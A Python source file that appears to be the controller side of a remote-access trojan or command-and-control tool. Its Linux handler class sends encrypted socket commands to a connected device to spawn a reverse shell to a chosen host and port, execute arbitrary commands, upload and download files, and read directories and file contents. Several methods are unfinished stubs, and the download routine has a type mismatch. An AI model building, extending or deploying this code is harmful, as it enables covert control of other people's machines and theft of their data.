import socket
import time
import io
from Handlers.base import BaseHandler

class Linux(BaseHandler):
    """The Linux Handler Class to interact with the Device"""
    def save_infos(self):
        """Save Infos to the Device Database"""
        infos = self.infos()

    def __init__(self, conn, addr, key, id):
        super().__init__(addr, key, id)
        self.conn = conn
    def alive(self):
        try:
            self.conn.send(self.encrypt("alive:"))
        except socket.error:
            return False
        return True
    def load_module(self, module):
        # Send the Module to the Device
        pass

    def execute_module(self, module) -> str:
        # Send a Request to execute a Module
        # Check if Modules is loaded
        # Get Output from the Module
        ...

    def reverse_shell(self, address, port) -> str:
        self.conn.send(self.encrypt(f"shell:{address}:{port}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't open a Reverse Shell")
        else:
            return output

    def file_upload(self, local_file: io.TextIOWrapper, remote_path:str) -> str:
        self.conn.send(self.encrypt(f"file-u:{remote_path}"))
        time.sleep(1)
        self.conn.sendfile(local_file)
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("File Upload Failed")
        else:
            return output

    def file_download(self, remote_path:str) -> io.TextIOWrapper:
        self.conn.send(self.encrypt(f"file-d:{remote_path}"))
        file = self.conn.recv(1024)
        if file.startswith("!"):
            raise Exception("Couldn't download the File")
        else:
            return file

    def rce(self, cmd:str) -> str:
        self.conn.send(self.encrypt(f"cmd:{cmd}"))
        output = self.decrypt(self.conn.recv(1024))
        return output

    def infos(self) -> str:
        """Get Infos about a Device
        Args:
        Returns:
            str: Infos about the Device
        """
        self.conn.send(self.encrypt(f"infos:"))
        output = self.decrypt(self.conn.recv(1024))
        return output

    def get_directory_contents(self, dir:str) -> str:
        self.conn.send(self.encrypt(f"dir:{dir}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't get the Directory")
        else:
            return output

    def get_file_contents(self, path:str) -> str:
        self.conn.send(self.encrypt(f"content:{path}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't get the File")
        else:
            return output
